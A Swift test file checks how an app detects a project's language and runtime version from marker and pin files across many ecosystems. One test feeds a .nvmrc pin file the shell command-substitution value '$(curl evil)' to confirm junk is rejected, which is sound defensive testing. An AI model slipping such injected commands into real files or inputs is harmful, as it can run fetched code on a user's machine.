@testable import Core
import Foundation
import Testing

/// Projects at a glance (D-279): language and version from marker files alone.
struct ProjectGlanceTests {
    private func inspect(
        _ files: [String: String], nested: [String: [String: String]] = [:]
    ) -> (languages: [ProjectLanguage], runtime: ProjectRuntimeVersion?) {
        var folders = [MarkerFolder(path: "", names: Set(files.keys))]
        var all = files
        for (path, inner) in nested {
            folders.append(MarkerFolder(path: path, names: Set(inner.keys)))
            for (name, text) in inner {
                all[path + "/" + name] = text
            }
        }
        return ProjectMarkers.inspect(folders: folders) { all[$0] }
    }

    @Test("Each language's marker")
    func languages() {
        let cases: [(String, ProjectLanguage)] = [
            ("Package.swift", .swift), ("App.xcodeproj", .swift), ("App.xcworkspace", .swift), ("Cargo.toml", .rust), ("go.mod", .go),
            ("package.json", .javaScript), ("pyproject.toml", .python), ("requirements.txt", .python), ("setup.py", .python), (
                "Pipfile",
                .python
            ),
            ("Gemfile", .ruby), ("pom.xml", .java), ("build.gradle", .java), ("build.gradle.kts", .kotlin), ("mix.exs", .elixir),
            ("pubspec.yaml", .dart), ("build.zig", .zig), ("composer.json", .php), ("CMakeLists.txt", .cAndCPP), ("deno.json", .typeScript),
            (".python-version", .python), (".ruby-version", .ruby), (".nvmrc", .javaScript),
        ]
        for (marker, language) in cases {
            #expect(ProjectMarkers.languages(in: [marker]) == [language], "\(marker)")
        }
        #expect(ProjectMarkers.languages(in: [".git", "README.md", "Makefile"]).isEmpty)
    }

    @Test("TypeScript over JavaScript; a compiled manifest over package.json's tooling")
    func priorities() {
        #expect(ProjectMarkers.languages(in: ["package.json", "tsconfig.json"]) == [.typeScript])
        #expect(ProjectMarkers.languages(in: ["package.json", "Cargo.toml"]) == [.rust, .javaScript])
        #expect(ProjectMarkers.languages(in: ["package.json", "Gemfile"]) == [.ruby, .javaScript])
        #expect(ProjectMarkers.languages(in: ["Package.swift", "App.xcodeproj"]) == [.swift])
    }

    @Test("An Xcode project's sources beside it can say Objective-C")
    func objectiveC() {
        #expect(ProjectMarkers.languages(in: ["App.xcodeproj", "main.m"]) == [.objectiveC])
        #expect(ProjectMarkers.languages(in: ["App.xcodeproj", "main.m", "App.swift"]) == [.swift])
    }

    @Test("Node: the pin files first, then package.json")
    func node() {
        #expect(inspect(["package.json": "{}", ".nvmrc": "v20.11.0\n"]).runtime == .init(
            runtime: "Node",
            version: "v20.11.0",
            file: ".nvmrc"
        ))
        #expect(inspect([".nvmrc": "lts/iron"]).runtime?.version == "lts/iron")
        #expect(inspect(["package.json": "{}", ".node-version": "18.19.0"]).runtime?.file == ".node-version")
        #expect(inspect(["package.json": "{}", ".tool-versions": "ruby 3.2.2\nnodejs 20.11.0 18.0.0\n"]).runtime?.version == "20.11.0")
        #expect(inspect(["package.json": #"{"engines":{"node":">=18 <21"}}"#]).runtime?.version == ">=18 <21")
        #expect(inspect(["package.json": #"{"volta":{"node":"20.1.0"},"engines":{"node":">=18"}}"#]).runtime?.version == "20.1.0")
        #expect(inspect(["package.json": "{}"]).runtime == nil)
        #expect(inspect(["package.json": "not json"]).runtime == nil)
    }

    @Test("Python")
    func python() {
        #expect(inspect([".python-version": "3.12.1\n"]).runtime == .init(runtime: "Python", version: "3.12.1", file: ".python-version"))
        let pyproject = "[project]\nname = \"x\"\nrequires-python = \">=3.11\"\n"
        #expect(inspect(["pyproject.toml": pyproject]).runtime == .init(runtime: "Python", version: ">=3.11", file: "pyproject.toml"))
        #expect(inspect(["Pipfile": "[requires]\npython_version = \"3.10\"\n"]).runtime?.version == "3.10")
        #expect(inspect(["requirements.txt": "flask\n", "runtime.txt": "python-3.11.4\n"]).runtime?.version == "3.11.4")
        #expect(inspect(["requirements.txt": "flask\n", ".tool-versions": "python 3.9.0\n"]).runtime?.version == "3.9.0")
        #expect(inspect(["requirements.txt": "flask\n"]).runtime == nil)
    }

    @Test("Swift, with the tools version in any of its spellings")
    func swift() {
        for line in [
            "// swift-tools-version:6.0",
            "// swift-tools-version: 6.0",
            "//swift-tools-version:6.0",
            "// swift-tools-version:6.0;experimentalFeature",
        ] {
            #expect(inspect(["Package.swift": line + "\nimport PackageDescription\n"]).runtime?.version == "6.0", "\(line)")
        }
        #expect(inspect(["Package.swift": "// swift-tools-version:6.0"]).runtime?.runtime == "Swift tools")
        #expect(inspect(["Package.swift": "import PackageDescription\n"]).runtime == nil)
        #expect(inspect(["Package.swift": "// swift-tools-version:6.0", ".swift-version": "5.10\n"]).runtime == .init(
            runtime: "Swift",
            version: "5.10",
            file: ".swift-version"
        ))
    }

    @Test("An Xcode project's Swift version, the newest of its targets'")
    func xcode() {
        let project = "\t\t\t\tSWIFT_VERSION = 5.0;\n\t\t\t\tOTHER = 1;\n\t\t\t\tSWIFT_VERSION = 6.2;\n\t\t\t\tSWIFT_VERSION = 5.10;\n"
        let found = ProjectMarkers.inspect(folders: [MarkerFolder(path: "", names: ["App.xcodeproj"])]) {
            $0 == "App.xcodeproj/project.pbxproj" ? project : nil
        }
        #expect(found.runtime == .init(runtime: "Swift", version: "6.2", file: "App.xcodeproj"))
        #expect(ProjectMarkers.xcodeSwiftVersion("OTHER = 1;\n") == nil)
        // Package.swift says first.
        let both = ProjectMarkers.inspect(folders: [MarkerFolder(path: "", names: ["App.xcodeproj", "Package.swift"])]) {
            $0 == "Package.swift" ? "// swift-tools-version:5.9\n" : project
        }
        #expect(both.runtime?.version == "5.9")
    }

    @Test("Go: its toolchain line, else its go line")
    func go() {
        #expect(inspect(["go.mod": "module x\n\ngo 1.22\n"]).runtime == .init(runtime: "Go", version: "1.22", file: "go.mod"))
        #expect(inspect(["go.mod": "module x\n\ngo 1.22\n\ntoolchain go1.22.1\n"]).runtime?.version == "1.22.1")
        #expect(inspect(["go.mod": "module x\n", ".tool-versions": "golang 1.21.0\n"]).runtime?.version == "1.21.0")
        #expect(inspect(["go.mod": "module x\n"]).runtime == nil)
    }

    @Test("Rust")
    func rust() {
        #expect(inspect(["Cargo.toml": "[package]\nrust-version = \"1.70\"\nedition = \"2021\"\n"]).runtime?.version == "1.70")
        #expect(inspect(["Cargo.toml": "", "rust-toolchain": "nightly-2024-01-01\n"]).runtime?.version == "nightly-2024-01-01")
        #expect(inspect(["Cargo.toml": "", "rust-toolchain.toml": "[toolchain]\nchannel = \"1.82\"\n"]).runtime?.version == "1.82")
        #expect(inspect(["Cargo.toml": "[package]\nedition = \"2021\"\n"]).runtime == nil)
    }

    @Test("Ruby, Java, Elixir, Dart, Zig and PHP")
    func others() {
        #expect(inspect([".ruby-version": "3.2.2\n"]).runtime?.version == "3.2.2")
        #expect(inspect(["Gemfile": "source 'https://rubygems.org'\nruby '3.1.0'\n"]).runtime?.version == "3.1.0")
        #expect(inspect(["pom.xml": "<properties><java.version>17</java.version></properties>"]).runtime?.version == "17")
        #expect(inspect(["pom.xml": "<maven.compiler.release>21</maven.compiler.release>"]).runtime?.version == "21")
        #expect(inspect(["build.gradle": "", ".java-version": "17.0\n"]).runtime?.version == "17.0")
        #expect(inspect(["build.gradle": "", ".sdkmanrc": "java=21.0.1-tem\n"]).runtime?.version == "21.0.1-tem")
        #expect(inspect(["mix.exs": "      elixir: \"~> 1.15\",\n"]).runtime?.version == "~> 1.15")
        #expect(inspect(["pubspec.yaml": "environment:\n  sdk: \">=3.0.0 <4.0.0\"\n"]).runtime?.version == ">=3.0.0 <4.0.0")
        #expect(inspect(["build.zig": "", ".zig-version": "0.13.0\n"]).runtime?.version == "0.13.0")
        #expect(inspect(["composer.json": #"{"require":{"php":"^8.2"}}"#]).runtime?.version == "^8.2")
        #expect(inspect(["CMakeLists.txt": ""]).runtime == nil)
    }

    @Test("mise's tools table")
    func mise() {
        let file = "[env]\nnode = \"1\"\n[tools]\nnode = \"20\"\npython = '3.12'\n"
        #expect(inspect(["package.json": "{}", "mise.toml": file]).runtime?.version == "20")
        #expect(inspect(["pyproject.toml": "", ".mise.toml": file]).runtime?.version == "3.12")
    }

    @Test("A comment or a blank line isn't a version, and junk in a pin file isn't shown")
    func junk() {
        #expect(inspect([".nvmrc": "# comment\n\n20.1.0 # latest\n"]).runtime?.version == "20.1.0")
        #expect(inspect([".nvmrc": ""]).runtime == nil)
        #expect(inspect([".nvmrc": "$(curl evil)"]).runtime == nil)
        #expect(inspect([".python-version": String(repeating: "3", count: 200)]).runtime == nil)
        #expect(inspect([".nvmrc": "hello"]).runtime == nil)
        #expect(ProjectMarkers.clean("stable") == "stable")
    }

    @Test("A file listed but unreadable reads as nothing")
    func unreadable() {
        let found = ProjectMarkers.inspect(folders: [MarkerFolder(path: "", names: [".nvmrc", "package.json"])]) { _ in nil }
        #expect(found.languages == [.javaScript] && found.runtime == nil)
    }

    @Test("A repository with its code a level or two down: found, and its version read from there")
    func nested() {
        // How this app itself is laid out.
        let found = inspect(
            [".git": "", "Makefile": ""],
            nested: [
                "Packages": [:], "Packages/Kit": ["Package.swift": "// swift-tools-version:6.0\n"], "website": ["package.json": "{}"],
            ]
        )
        #expect(found.languages.first == .javaScript || found.languages.first == .swift)
        #expect(Set(found.languages) == [.swift, .javaScript])
        #expect(found.runtime != nil)
        // Nearer folders first.
        let near = inspect([".git": ""], nested: ["a/b": ["Cargo.toml": ""], "c": ["go.mod": "go 1.22\n"]])
        #expect(near.languages == [.go, .rust])
        #expect(near.runtime == .init(runtime: "Go", version: "1.22", file: "go.mod"))
    }

    @Test("A project's own markers win over anything inside it")
    func ownMarkersWin() {
        let found = inspect(["Package.swift": "// swift-tools-version:5.9"], nested: ["tools": ["package.json": "{}"]])
        #expect(found.languages == [.swift])
    }

    @Test("A version file at the top applies to a language found lower down")
    func topPin() {
        let found = inspect([".tool-versions": "nodejs 22.1.0\n"], nested: ["web": ["package.json": "{}"]])
        #expect(found.runtime?.version == "22.1.0")
    }

    @Test("Most recently worked in first; never-known last")
    func sorted() {
        func project(_ name: String, _ time: Double?) -> ProjectGlance {
            ProjectGlance(
                root: "/p/" + name, name: name, languages: [], runtime: nil, sizeBytes: nil,
                lastWorked: time.map { Date(timeIntervalSince1970: $0) }
            )
        }
        let order = ProjectGlance.sorted([project("a", nil), project("b", 5), project("c", 9), project("d", 5)])
        #expect(order.map(\.name) == ["c", "b", "d", "a"])
    }
}
